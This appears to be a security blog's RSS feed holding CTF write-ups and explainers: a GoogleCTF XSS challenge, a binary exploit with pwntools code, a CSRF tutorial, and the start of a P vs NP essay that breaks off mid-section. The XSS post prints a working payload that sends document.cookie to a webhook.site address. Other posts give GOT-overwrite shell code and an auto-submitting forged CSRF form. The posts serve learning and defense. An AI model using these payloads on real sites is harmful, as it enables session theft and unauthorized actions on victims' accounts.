<p>This is my first attack-defense CTF. Having it fully online? An interesting experience. My mentors and other team members who had participated in more CTFs remarked that in-person attack-defenses are a completely different experience entirely, and I really want to see what that would be like (which I guess isn&rsquo;t anytime soon). The concept itself was cool, although the duty of maintaining the servers as a sysadmin was not necessarily something I was anticipating. Unfortunately, there was a limit to the amount of people who could participate in the finals, and if the limit was increased, more stratified and defined roles could have existed to allow members to focus on one specific thing in the CTF. Perhaps my next attack-defense will have a higher team limit.</p>
<p>But overall, the experience was a unique one, and I am happy to have participated in the attack-defense CTF given it was my first. Hopefully, there will be many more to come in my future.</p>
<p>Jam</p>]]></content>
        </item>
        
        <item>
            <title>GoogleCTF 2020: Pasteurize</title>
            <link>https://jamvie.net/posts/2020/08/googlectf-2020-pasteurize/</link>
            <pubDate>Sun, 23 Aug 2020 17:35:14 -0600</pubDate>
            
            <guid>https://jamvie.net/posts/2020/08/googlectf-2020-pasteurize/</guid>
            <description>This is the first challenge I worked on. I will soon upload a post on the second one. I completed this challenge with the help of my team mentor!
Let&amp;rsquo;s Begin! The challenge lets us load into the DOM whatever we want through this pastebin-esque function. When you make a note, you have an option to share it with a &amp;ldquo;TjMike&amp;rdquo; Entity. Sign of XSS/CSRF attacks?
 My input, &amp;ldquo;uwu&amp;rdquo;, is shoved into a javascript string variable called &amp;lsquo;note&amp;rsquo;.</description>
            <content type="html"><![CDATA[<p>This is the first challenge I worked on. I will soon upload a post on the second one. I completed this challenge with the help of my team mentor!</p>
<h2 id="lets-begin">Let&rsquo;s Begin!</h2>
<p>The challenge lets us load into the DOM whatever we want through this pastebin-esque function.
When you make a note, you have an option to share it with a &ldquo;TjMike&rdquo; Entity. Sign of XSS/CSRF attacks?</p>
<p>
    <img src="/images/google2020pastdompur.png"  alt="Login"  class="center"  style="border-radius: 8px;"  />


<em>My input, &ldquo;uwu&rdquo;, is shoved into a javascript string variable called &lsquo;note&rsquo;. Further down we see a</em> <code>const clean</code> <em>variable that calls DOMpurify to sanitize our input.</em></p>
<p>Looking into the HTML, whatever content we put into the note is immediately shoved into a javascript string. However, if you try to input quotation marks in there, the DOMpurify clean function escapes it. So, if we can get an unescaped quote in there, we can do whatever we want. Let&rsquo;s focus on the comment.</p>

    <img src="/images/google2020source.png"  alt="Login"  class="center"  style="border-radius: 8px;"  />


<p>Going to the <code>/source</code> endpoint takes us, well, directly to the webpage&rsquo;s app file.</p>
<p>Of note are the app&rsquo;s use of using the Express BodyParser to operate on &lsquo;extended&rsquo; mode (using the <code>qs</code> library instead of the <code>querystring</code> library).</p>

    <img src="/images/Google2020bodyparser.png"  alt="Login"  class="center"  style="border-radius: 8px;"  />


<p>In the source we also see:</p>

    <img src="/images/google2020json.png"  alt="Login"  class="center"  style="border-radius: 8px;"  />


<p><code>JSON.stringify(unsafe)</code> - if our content (unsafe) is a string, then the function simply adds additional quotation marks onto the string, and the <code>slice(1,-1)</code> function removes those extra quotations, before feeding it to the DOM to be rendered. What if our input isn&rsquo;t a string - what if it&rsquo;s an array?</p>
<p>The <a href="https://www.npmjs.com/package/qs#parsing-arrays"><code>qs</code></a> library allows arrays to be parsed from HTTP requests if theyre stipulated as:</p>
<pre><code>{
    array[]=a&amp;array[]=b

    //array = [a,b]
}
</code></pre><p>When we make a note (POST request to <code>/note</code>), intercept the request via burpsuite. Modify your query there. Change <code>content=</code> to <code>content[]=</code> (Alternatively, you can CURL your request to not deal with proxy settings).</p>

    <img src="/images/google2020pastalert.png"  alt="Login"  class="center"  style="border-radius: 8px;"  />



    <img src="/images/google2020xss.png"  alt="Login"  class="center"  style="border-radius: 8px;"  />


<p>If we go to the page, we see that an alert is prompted - aka, we have succesfully escaped the JS string and can write javascript code as normal. That being said, let&rsquo;s go ahead and craft a payload to xss TJMike (I am being lazy and reusing an old payload of mine from before and modifying it).</p>
<pre><code>content[]=; document.getElementById('note-content').onLoad = fetch('https://webhook.site/64627794-30a4-466d-b93a-537bdebca744', {method:'POST', body:JSON.stringify({data:document.cookie})});const uwu = 
</code></pre><p>Share our note to TJMike. Wait for our server to grab their cookie.</p>

    <img src="/images/googlectf2020pastflag.png"  alt="Login"  class="center"  style="border-radius: 8px;"  />


<p>Jam</p>
]]></content>
        </item>
        
        <item>
            <title>HacktivityCon CTF: Bullseye</title>
            <link>https://jamvie.net/posts/2020/08/hacktivitycon-ctf-bullseye/</link>
            <pubDate>Sun, 09 Aug 2020 18:48:52 -0600</pubDate>
            
            <guid>https://jamvie.net/posts/2020/08/hacktivitycon-ctf-bullseye/</guid>
            <description>&lt;p&gt;It&amp;rsquo;s clear to see from the content of my blog that my expertise lies in web-based exploits.&lt;/p&gt;</description>
            <content type="html"><![CDATA[<p>It&rsquo;s clear to see from the content of my blog that my expertise lies in web-based exploits.</p>
<p>However, I have mentioned before wanting to branch out and diversify my skillset in hacking; and while I definitely have more knowledge in web exploits, I also know a thing or two about pwning. Hacktivity Con CTF was a competition that ran this month, introducing several different challenges that I sunk my teeth into. I will showcase one of them here, called &ldquo;Bullseye&rdquo;.</p>
<h2 id="lets-begin">Let&rsquo;s Begin!</h2>
<p>Bullseye is a binary exploit challenge where we are given an executable called &ldquo;bullseye&rdquo;. Running it through ghidra, we can locate the main function - the binary isn&rsquo;t stripped:</p>

    <img src="/images/ghidrabullseye.png"  alt="Login"  class="center"  style="border-radius: 8px;"  />


<p>We&rsquo;re allowed a single &lsquo;write&rsquo; privilege to change some aspect of the program. In pwn challenges, the goal would be to change the value in the instruction pointer - typically, common knowledge is to change the original value in the EIP register and have it take the address of the libc <code>system</code> function, allowing us to open a shell and do all sorts of things. We don&rsquo;t know where the libc location is through the global offset table, so figuring out the address of <code>system</code> will be our main issue.</p>
<p>What&rsquo;s interesting is that the main() function returns by exit() - hence why we only get one write. However, if we use our one write to change exit() to instead jump back to main in the last line, we can bypass the &ldquo;one write only&rdquo; rule, sort of making our main() function recursive.</p>
<p>Doing this, we actually get a <a href="https://www.gnu.org/software/libc/">libc</a> leak, through the function <code>alarm</code>. I find out afterwards that ASLR is disabled in this executable! This is important - with this libc leak, we can solve our &ldquo;where is libc in the GOT&rdquo; question, and calculate the <code>system</code> function&rsquo;s address in memory through it.
So we now have an oppurtunity to call <code>system</code>, but what line should we replace in <code>main</code> to open our shell in?</p>
<p>Lines 16 and 20 feature a libc function called <code>strtoull</code>. The nature of <code>strtoull</code>, according to the standard lib documentation, is to take its single argument (provided its a string) and convert it to a long unsigned int. Since it expects my input, we can take advantage of that fact and replace it with our <code>system</code> calls while feeding in <code>&quot;/bin/sh&quot;</code> as our input.
We now have all the tools required to exploit this challenge.</p>
<ol>
<li>Use the program&rsquo;s functionality to change <code>exit()</code> to <code>main</code>. NOTE: I&rsquo;m using python&rsquo;s <a href="http://docs.pwntools.com/en/stable/"><code>pwn</code></a> library.</li>
</ol>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#f92672">...</span>
ch<span style="color:#f92672">.</span>remote(<span style="color:#e6db74">&#34;jh2i.com&#34;</span>, <span style="color:#ae81ff">50031</span>)

ch<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">&#34;write to?</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>)
ch<span style="color:#f92672">.</span>sendline(exe<span style="color:#f92672">.</span>got[<span style="color:#e6db74">&#34;exit&#34;</span>])
ch<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">&#34;to write?</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>)
</code></pre></div><ol start="2">
<li>Get the libc leak, and use it to calculate the base of libc.</li>
</ol>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python">alarm <span style="color:#f92672">=</span> ch<span style="color:#f92672">.</span>recvline()
alarm <span style="color:#f92672">=</span> int(alarm,<span style="color:#ae81ff">16</span>)
libc_base <span style="color:#f92672">=</span> alarm <span style="color:#f92672">-</span> libc<span style="color:#f92672">.</span>sym[<span style="color:#e6db74">&#39;alarm&#39;</span>]
</code></pre></div><ol start="3">
<li>With the base of libc, calculate the address location of <code>system</code>. Send the line of <code>strtoull</code> to be replaced by <code>system</code>.</li>
</ol>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python">ch<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">&#34;write to?</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>)
ch<span style="color:#f92672">.</span>sendline(exe<span style="color:#f92672">.</span>got[<span style="color:#e6db74">&#34;strtoull&#34;</span>])
ch<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">&#34;to write?</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>)
ch<span style="color:#f92672">.</span>sendline(libc_base <span style="color:#f92672">+</span> <span style="color:#ae81ff">0x554e0</span>)
ch<span style="color:#f92672">.</span>sendline(<span style="color:#e6db74">&#34;/bin/&#34;</span>)
</code></pre></div><ol start="4">
<li>Once we opened the shell, get the flag on their server!</li>
</ol>
<p><code>flag{one_write_two_write_good_write_bad_write}</code></p>
<p>Jam</p>]]></content>
        </item>
        
        <item>
            <title>Cross-Site Request Forgery: Introduction</title>
            <link>https://jamvie.net/posts/2020/07/cross-site-request-forgery-introduction/</link>
            <pubDate>Mon, 27 Jul 2020 19:07:51 -0600</pubDate>
            
            <guid>https://jamvie.net/posts/2020/07/cross-site-request-forgery-introduction/</guid>
            <description>Cross-Site Request Forgery is a common and prolific exploit that takes advantage of sessional cookies that browsers automatically allocate to HTTP requests - and they&amp;rsquo;re the reason you shouldn&amp;rsquo;t click suspicious links, even if the URL sort of sounds legitimate.
This is a discussion on the importance of protecting against such attacks, and to demystify the unknowns that many people have about the exploit in general. I will be using my solution for two challenges I did in the past to help explain my points - the writeups for which you can consult here as well.</description>
            <content type="html"><![CDATA[<p>Cross-Site Request Forgery is a common and prolific exploit that takes advantage of sessional cookies that browsers automatically allocate to HTTP requests - and they&rsquo;re the reason you shouldn&rsquo;t click suspicious links, even if the URL sort of sounds legitimate.</p>
<p>This is a discussion on the importance of protecting against such attacks, and to demystify the unknowns that many people have about the exploit in general. I will be using my solution for two challenges I did in the past to help explain my points - the writeups for which you can consult here as well.</p>
<h2 id="lets-begin">Let&rsquo;s Begin!</h2>
<p>CSRF attacks are exploits that trick users into unknowingly performing actions that they didn&rsquo;t intend/consent to perform. They work through using your credentials without you actually knowing - through the use of automatic additions of your session ID to browser cookies in HTTP requests. How, specifically, do the CSRF exploits work?</p>
<p>Consider my writeup for the challenge &ldquo;<a href="/posts/2020/06/redpwnctf-2020-part-2/#cookie-recipes-v2">cookie-recipes-v2</a>&rdquo; from Redpwnctf 2020. The challenge called for us to execute multiple CSRF attacks - but the reason why we wanted to do a CSRF attack and not an XSS attack (the two are quite similar) lies in the architecture of the underlying server.</p>
<p>The premise of the challenge was that you could &ldquo;purchase&rdquo; the flag in the program if you had enough virtual credits to do so - the price for buying the flag was around 1000 credits, but when you make an account, you start with only 200 (or 100?). At first glance, there are no ways to gain more credits, and so you were out of luck. However, in the infrastructure of the application, there exists a certain API endpoint called <code>/gift</code>:</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-js" data-lang="js">[<span style="color:#e6db74">&#39;gift&#39;</span>, <span style="color:#a6e22e">async</span> (<span style="color:#a6e22e">req</span>, <span style="color:#a6e22e">res</span>) =&gt; {
        <span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">req</span>.<span style="color:#a6e22e">method</span> <span style="color:#f92672">!==</span> <span style="color:#e6db74">&#39;POST&#39;</span>) {
            <span style="color:#a6e22e">res</span>.<span style="color:#a6e22e">writeHead</span>(<span style="color:#ae81ff">405</span>);
            <span style="color:#a6e22e">res</span>.<span style="color:#a6e22e">end</span>();
            <span style="color:#66d9ef">return</span>;
        }
        <span style="color:#66d9ef">const</span> <span style="color:#a6e22e">result</span> <span style="color:#f92672">=</span> {
            <span style="color:#e6db74">&#39;success&#39;</span><span style="color:#f92672">:</span> <span style="color:#66d9ef">false</span>
        };

        <span style="color:#75715e">// Get token from cookie
</span><span style="color:#75715e"></span>        <span style="color:#66d9ef">const</span> <span style="color:#a6e22e">cookies</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">util</span>.<span style="color:#a6e22e">parseCookies</span>(<span style="color:#a6e22e">req</span>.<span style="color:#a6e22e">headers</span>.<span style="color:#a6e22e">cookie</span>);
        <span style="color:#66d9ef">if</span> (<span style="color:#f92672">!</span><span style="color:#a6e22e">cookies</span>.<span style="color:#a6e22e">has</span>(<span style="color:#e6db74">&#39;token&#39;</span>)) {
            <span style="color:#a6e22e">util</span>.<span style="color:#a6e22e">respondJSON</span>(<span style="color:#a6e22e">res</span>, <span style="color:#ae81ff">200</span>, <span style="color:#a6e22e">result</span>);
            <span style="color:#66d9ef">return</span>;
        }

        <span style="color:#66d9ef">const</span> <span style="color:#a6e22e">token</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">cookies</span>.<span style="color:#a6e22e">get</span>(<span style="color:#e6db74">&#39;token&#39;</span>);
        <span style="color:#66d9ef">if</span> (<span style="color:#66d9ef">typeof</span>(<span style="color:#a6e22e">token</span>) <span style="color:#f92672">!==</span> <span style="color:#e6db74">&#39;string&#39;</span>) {
            <span style="color:#a6e22e">result</span>.<span style="color:#a6e22e">error</span> <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;Invalid token&#39;</span>;
            <span style="color:#a6e22e">util</span>.<span style="color:#a6e22e">respondJSON</span>(<span style="color:#a6e22e">res</span>, <span style="color:#ae81ff">401</span>, <span style="color:#a6e22e">result</span>);
            <span style="color:#66d9ef">return</span>;
        }


        <span style="color:#75715e">// Get id from token
</span><span style="color:#75715e"></span>        <span style="color:#66d9ef">let</span> <span style="color:#a6e22e">id</span>;
        <span style="color:#66d9ef">try</span> {
            <span style="color:#a6e22e">id</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">database</span>.<span style="color:#a6e22e">getId</span>(<span style="color:#a6e22e">token</span>);
        } <span style="color:#66d9ef">catch</span> (<span style="color:#a6e22e">error</span>) {
            <span style="color:#a6e22e">res</span>.<span style="color:#a6e22e">writeHead</span>(<span style="color:#ae81ff">500</span>);
            <span style="color:#a6e22e">res</span>.<span style="color:#a6e22e">end</span>();
            <span style="color:#66d9ef">return</span>;
        }
        <span style="color:#66d9ef">if</span> (<span style="color:#f92672">!</span><span style="color:#a6e22e">id</span>) {
            <span style="color:#a6e22e">result</span>.<span style="color:#a6e22e">error</span> <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;Invalid token&#39;</span>;
            <span style="color:#a6e22e">util</span>.<span style="color:#a6e22e">respondJSON</span>(<span style="color:#a6e22e">res</span>, <span style="color:#ae81ff">401</span>, <span style="color:#a6e22e">result</span>);
            <span style="color:#66d9ef">return</span>;
        }

        <span style="color:#75715e">// Make sure request is from admin
</span><span style="color:#75715e"></span>        <span style="color:#66d9ef">try</span> {
            <span style="color:#66d9ef">if</span> (<span style="color:#f92672">!</span><span style="color:#a6e22e">database</span>.<span style="color:#a6e22e">isAdmin</span>(<span style="color:#a6e22e">id</span>)) {
                <span style="color:#a6e22e">res</span>.<span style="color:#a6e22e">writeHead</span>(<span style="color:#ae81ff">403</span>);
                <span style="color:#a6e22e">res</span>.<span style="color:#a6e22e">end</span>();
                <span style="color:#66d9ef">return</span>;
            }
        } <span style="color:#66d9ef">catch</span> (<span style="color:#a6e22e">error</span>) {
            <span style="color:#a6e22e">res</span>.<span style="color:#a6e22e">writeHead</span>(<span style="color:#ae81ff">500</span>);
            <span style="color:#a6e22e">res</span>.<span style="color:#a6e22e">end</span>();
            <span style="color:#66d9ef">return</span>;
        }

        <span style="color:#75715e">// Get target user id from url
</span><span style="color:#75715e"></span>        <span style="color:#66d9ef">const</span> <span style="color:#a6e22e">user_id</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">util</span>.<span style="color:#a6e22e">parseParams</span>(<span style="color:#a6e22e">req</span>).<span style="color:#a6e22e">id</span>;
        <span style="color:#66d9ef">if</span> (<span style="color:#66d9ef">typeof</span> <span style="color:#a6e22e">user_id</span> <span style="color:#f92672">!==</span> <span style="color:#e6db74">&#39;string&#39;</span>) {
            <span style="color:#a6e22e">res</span>.<span style="color:#a6e22e">writeHead</span>(<span style="color:#ae81ff">400</span>);
            <span style="color:#a6e22e">res</span>.<span style="color:#a6e22e">end</span>();
            <span style="color:#66d9ef">return</span>;
        }

[...]
</code></pre></div><p>This endpoint was only relevant to the admin, who they could specify a user to gift tokens to. This is a <strong>state-changing action of interest</strong> to us, a hallmark signal that a CSRF exploit is at play here. CSRFs work by carrying out relevant actions that change some aspect of the program for us - doing so whilst using the permissions of a user without that user ever authorizing.</p>
<p>The first few checks in the endpoint are important to focus on: in order to validate that the user calling this endpoint has admin privileges, the server extracts a token ID from the cookies that are packaged in the request - cookies that are automatically added by the client. In these cookies exist sessional-based IDs, and they help to identify a person utilizing an application. However, if this application only relies on cookie-based user verification to verify their users, CSRF vulnerabilities will occur. This seems good on paper: if you don&rsquo;t have the correct token ID from the browser/client-added cookie packaged in the request, then your request will be denied, because you need the same ID as the valid user, which is only in use when the user is currently utilizing the application. However, if it&rsquo;s the only form of checking that a program does, a malicious hacker can easily bypass that check. This is where the language &ldquo;perform actions that the user didn&rsquo;t authorize&rdquo; becomes important. In a CSRF attack, you&rsquo;re the one making the request, you just don&rsquo;t know that you&rsquo;re making it.</p>
<p>Back to my REDPWNCTF example, consider this webpage, crafted and hosted by a hacker:</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-HTML" data-lang="HTML">&lt;<span style="color:#f92672">html</span>&gt;
  &lt;<span style="color:#f92672">body</span>&gt;
    &lt;<span style="color:#f92672">form</span> <span style="color:#a6e22e">action</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;https://cookie-recipes-v2.2020.redpwnc.tf/api/gift?id=1234567890&#34;</span> <span style="color:#a6e22e">method</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;POST&#34;</span>&gt;
    &lt;/<span style="color:#f92672">form</span>&gt;
    &lt;<span style="color:#f92672">script</span>&gt;
      document.<span style="color:#a6e22e">forms</span>[<span style="color:#ae81ff">0</span>].<span style="color:#a6e22e">submit</span>();
    &lt;/<span style="color:#f92672">script</span>&gt;
  &lt;/<span style="color:#f92672">body</span>&gt;
&lt;/<span style="color:#f92672">html</span>&gt;
</code></pre></div><p>When someone visits this webpage and the browser loads it, the form in the webpage is automatically constructed, and the <code>&lt;script&gt;</code> tag ensures its sent immediately. If any user who doesn&rsquo;t have admin priviliges visits this webpage and makes a POST request unknowingly, their sessional id that is automatically added into the request by the browser will be extracted from their cookie by the server, and their request will be rejected. Thus, nothing will happen when we non-admin users visit. However, if an admin visits this webpage, their id that is extracted from their cookie will be validated, and the request will be accepted. All the admin did was simply visit the webpage in question - the request was sent, using the admin&rsquo;s credentials without the them ever knowing or consenting. The request, once validated, will fire the endpoint and do all the necessary actions - and the user with the ID &ldquo;1234567890&rdquo; will be gifted credits.</p>
<p>There&rsquo;s alot more to this challenge than just the CSRF exploit - so I encourage you to read my <a href="/posts/2020/06/redpwnctf-2020-part-2/#cookie-recipes-v2">writeup</a> on it if you would like to learn more about it.</p>
<hr>
<p>Now, there exists a common technique that helps to prevent CSRF attacks, known as CSRF tokens.</p>
<p>CSRF tokens violate two main paradigms that would typically ensure the success of a CSRF attack: making some aspect of the request parameters in doing a state-changing action unpredictable, and additionally needing more than just the cookie session ID to validate a user.</p>
<p>The tokens are values that which are unpredictable - consider them to be variables like passwords, and thus are only as effective as the number of bits of entropy is high.</p>
<p>CSRF tokens work through being generated from the server, and transmitted back to the client. The client must then include this secret value into their next HTML request back to the server - if that value is malformed or missing, the server rejects the request regardless if that user&rsquo;s session ID from the cookie was validated in it. The generation of the token can be once per user, or once per new request. Typically, adding this extra level of verification to all state-changing requests are a good way to mitigate any possible CSRF exploits in your application. However, the use of these tokens must also be treated with caution, for they can be trivial to bypass if not implemented correctly.</p>
<p>As an example, consider my other writeup for the challenge &ldquo;<a href="/posts/2020/07/redpwnctf-2020-part-3/">Viper</a>&quot;, also from REDPWNCTF 2020. The premise of that challenge focused mainly on another vulnerability known as cache-poisoning, but at its core, the use of poisoning was a vehicle to deliver a CSRF attack. We wanted to utilize an API endpoint that was only relevant if visited by an admin. The endpoint in question would change the contents of a webpage if it was called. This challenge also employed CSRF tokens that would shut down any basic attempts at unauthorized request making, which were generated by an RNG function. Consider the provided code found in Viper&rsquo;s infrastructure:</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-js" data-lang="js"><span style="color:#a6e22e">app</span>.<span style="color:#a6e22e">get</span>(<span style="color:#e6db74">&#39;/analytics&#39;</span>, <span style="color:#66d9ef">function</span> (<span style="color:#a6e22e">req</span>, <span style="color:#a6e22e">res</span>) {
    <span style="color:#66d9ef">const</span> <span style="color:#a6e22e">ip_address</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">req</span>.<span style="color:#a6e22e">query</span>.<span style="color:#a6e22e">ip_address</span>;

(...)

    <span style="color:#a6e22e">client</span>.<span style="color:#a6e22e">exists</span>(<span style="color:#a6e22e">ip_address</span>, <span style="color:#66d9ef">function</span>(<span style="color:#a6e22e">err</span>, <span style="color:#a6e22e">reply</span>) {
        <span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">reply</span> <span style="color:#f92672">===</span> <span style="color:#ae81ff">1</span>) {
            <span style="color:#a6e22e">client</span>.<span style="color:#a6e22e">incr</span>(<span style="color:#a6e22e">ip_address</span>, <span style="color:#66d9ef">function</span>(<span style="color:#a6e22e">err</span>, <span style="color:#a6e22e">reply</span>) {
                <span style="color:#66d9ef">if</span>(<span style="color:#a6e22e">err</span>){
                    <span style="color:#a6e22e">res</span>.<span style="color:#a6e22e">status</span>(<span style="color:#ae81ff">500</span>).<span style="color:#a6e22e">send</span>(<span style="color:#e6db74">&#34;Something went wrong&#34;</span>);
                    <span style="color:#66d9ef">return</span>;
                }
                <span style="color:#a6e22e">res</span>.<span style="color:#a6e22e">status</span>(<span style="color:#ae81ff">200</span>).<span style="color:#a6e22e">send</span>(<span style="color:#e6db74">&#34;Success! &#34;</span> <span style="color:#f92672">+</span> <span style="color:#a6e22e">ip_address</span> <span style="color:#f92672">+</span> <span style="color:#e6db74">&#34; has visited the site &#34;</span> <span style="color:#f92672">+</span> <span style="color:#a6e22e">reply</span> <span style="color:#f92672">+</span> <span style="color:#e6db74">&#34; times.&#34;</span>);
            });
        } <span style="color:#66d9ef">else</span> {
            <span style="color:#a6e22e">client</span>.<span style="color:#a6e22e">set</span>(<span style="color:#a6e22e">ip_address</span>, <span style="color:#ae81ff">1</span>, <span style="color:#66d9ef">function</span>(<span style="color:#a6e22e">err</span>, <span style="color:#a6e22e">reply</span>) {
                <span style="color:#66d9ef">if</span>(<span style="color:#a6e22e">err</span>){
                    <span style="color:#a6e22e">res</span>.<span style="color:#a6e22e">status</span>(<span style="color:#ae81ff">500</span>).<span style="color:#a6e22e">send</span>(<span style="color:#e6db74">&#34;Something went wrong&#34;</span>);
                    <span style="color:#66d9ef">return</span>;
                }
                <span style="color:#a6e22e">res</span>.<span style="color:#a6e22e">status</span>(<span style="color:#ae81ff">200</span>).<span style="color:#a6e22e">send</span>(<span style="color:#e6db74">&#34;Success! &#34;</span> <span style="color:#f92672">+</span> <span style="color:#a6e22e">ip_address</span> <span style="color:#f92672">+</span> <span style="color:#e6db74">&#34; has visited the site 1 time.&#34;</span>);
            });
        }
    });
 });
</code></pre></div><p>The token in this challenge is a randomly generated number, that is between 10000-1000000000 bits long. There is no efficient way to brute-force its value. That being said, the mishandling of such tokens is one of the vulnerabilities we are meant to exploit in this challenge.
Tokens should not be passed around in multiple areas of the infrastructure where it could possibly be leaked. Ideally, you would want your token values to be dynamically generated unique to your user/request, and then discarded afterwards. However, the Viper challenge employed a cache which kept the admin&rsquo;s CSRF token, which was dynamically changing based on the number of times the admin visited the page, inside it with a trivially easy-to-figure-out cache key(&quot;__csrftoken__admin_account&rdquo;). If you wanted to grab the CSRF token, you just needed to make a request with the correct cache key formatted in your request params to recieve the CSRF token.
With this, you could construct a CSRF attack as normal, including the token to bypass that additional check.</p>
<pre><code>curl http://2020.redpwnc.tf:31291/analytics?ip_address=__csrftoken__admin_account
</code></pre>
    <img src="/images/REDPWN2020_ViperCSRF.png"  alt="Login"  class="center"  style="border-radius: 8px;"  />


<p>It&rsquo;s important to guard against CSRF attacks - they&rsquo;re prolific and yet, despite plenty of security researchers implementing different ways to protect against them, they still pop up. The reason why you shouldn&rsquo;t click on any suspicious unverified link is due to the possibility that the application the link could be spoofing is vulnerable against CSRF attacks - the webpage you will be directed to could look like my simplified HTML webpage above, with a request constructed behind the scenes and sent to the server with your credentials/validation stamped on it. Once you visit that webpage, you unfortunately wouldn&rsquo;t be able to do anything to undo or &ldquo;unsend&rdquo; that request. CSRF attacks could install applications into your computer without your knowledge via downloading the source online, they could change your email address or rescind privileges from users - if there exists an action that is initiated from an HTTP request, then a CSRF attack can happen from it. Of course, CSRF attacks aren&rsquo;t the only thing that you&rsquo;d have to worry about if you click a suspicious link - we still need to worry about Cross-Site Scripting attacks (XSS), but that might be an article for some other time.</p>
<p>Jam</p>
]]></content>
        </item>
        
        <item>
            <title>Cryptography and P vs. NP: A Basic Outline</title>
            <link>https://jamvie.net/posts/2020/07/cryptography-and-p-vs.-np-a-basic-outline/</link>
            <pubDate>Tue, 14 Jul 2020 00:22:00 -0600</pubDate>
            
            <guid>https://jamvie.net/posts/2020/07/cryptography-and-p-vs.-np-a-basic-outline/</guid>
            <description>Comic from XKCD.
I am not an expert in either cryptography nor algorithm analysis. However, ever since a very rewarding advanced algorithm analysis class, one question has always dwelled in my mind: what would &amp;ldquo;P=NP&amp;rdquo; mean for cryptography? I had heard that such a statement, &amp;ldquo;P=NP&amp;rdquo; is controversial in the world of security. Learning about algorithm complexity has certainly shed quite a bit of light on the topic. As a cybersecurity researcher, I was compelled to satisfy my curiosity and answer that question for myself.</description>
            <content type="html"><![CDATA[<p><em>Comic from <a href="https://xkcd.com/1667/">XKCD</a>.</em></p>
<p>I am not an expert in either cryptography nor algorithm analysis. However, ever since a very rewarding advanced algorithm analysis class, one question has always dwelled in my mind: what would &ldquo;P=NP&rdquo; mean for cryptography? I had heard that such a statement, &ldquo;P=NP&rdquo; is controversial in the world of security. Learning about algorithm complexity has certainly shed quite a bit of light on the topic. As a cybersecurity researcher, I was compelled to satisfy my curiosity and answer that question for myself.</p>
<p>I do not consider myself an authority on either algorithm complexity analysis nor cryptography. However, I hope that this quick outline of the important concepts illustrates the severity of &ldquo;P=NP&rdquo; in the world of security. If this post could spur other individuals to think about and appreciate the uncertainty of proving such a statement, and appreciate how far we have come in data privacy, then I would be satisfied that I brought this discussion forward.</p>
<p>So, let&rsquo;s first begin with a few explanations.</p>
<h2 id="what-does-p-vs-np-even-mean">What does “P vs. NP” even mean?</h2>
<p>For the sake of this article, I won’t be going too in-depth on the definition of P or NP, but I will give a quick rundown here.
In computer science, there exist numerous different computing problems that can be grouped into different categories based on the efficiency of their solution (if there exists one). Many problems that we are introduced to as a beginner CS student are all considered “easy” to solve: they have solutions that are verified to have run in <strong>O{n^k}</strong> (n raised to the power of k) time - polynomial time. Problems such as determining graph-connectivity(BFS), sorting an array(quick sort), or finding an element in an array (binary search) are all considered to be easy problems; they are considered amongst the problems in “P” - polynomial time.
The opposite of this are problems that are known to be “hard” - no solution exists that runs in polynomial time. To prove a problem is hard, is to prove that there is, <strong>without a doubt</strong>, no solution that which is verified to run in polynomial. Therefore, they are considered NOT in “P”.</p>
<p>But, as with everything in life, uncertainty must be accounted for and in the world of applied mathematics and algorithms, how do we group problems that don’t have a polynomial solution <em>yet</em>? The wording I used in the above paragraph is important - problems are hard if it is verified that absolutely no polynomial solution exists. However, it is natural to consider the problems with which we have yet to prove or disprove the existence of a polynomial solution in the first place. This is where the category of “NP” comes in. The travelling salesman problem, the boolean satisfiability problem, the graph-colouring problem. Consider these problems stuck in limbo, where we have yet to really figure out if an efficient solution exists that can solve them. The category “NP” showcases this state of limbo as it encompasses these uncertain problems AND problems in “P”. Do they or do they not have efficient solutions? To consider only the problems in limbo, we group them in their own category of “NP-complete”.
Something that is incredibly interesting and fascinating about NP-complete problems is their ability to be reduced into another instance of a different NP-complete problem. This is explained in the celebrated Cook-Levin Theorem, which proves that any problem in NP can be reduced to the boolean satisfiability problem, which itself has been proven to be NP-complete.</p>
<p>Several things require context here.</p>
<h3 id="np-completeness">NP-Completeness</h3>
<p>The definition of NP-Completeness that I will be working with is the subset of problems that are formed from the intersection of the subset of NP problems, and NP-Hard problems. The diagram below gives a visual representation of the subset of NP-Complete problems (courtesy of <a href="https://www.geeksforgeeks.org/np-completeness-set-1/">GeeksForGeeks</a>):</p>

    <img src="/images/NP-Completeness-1.png"  alt="Login"  class="center"  style="border-radius: 8px;"  />


<p>NP-Completeness of a problem can be proven using a verifier algorithm that will be given a purported solution of the problem, and apply that solution and validate its correctness (or determine if it isn’t). The verifier algorithm runs in polynomial time.</p>
<h3 id="reduction">Reduction</h3>
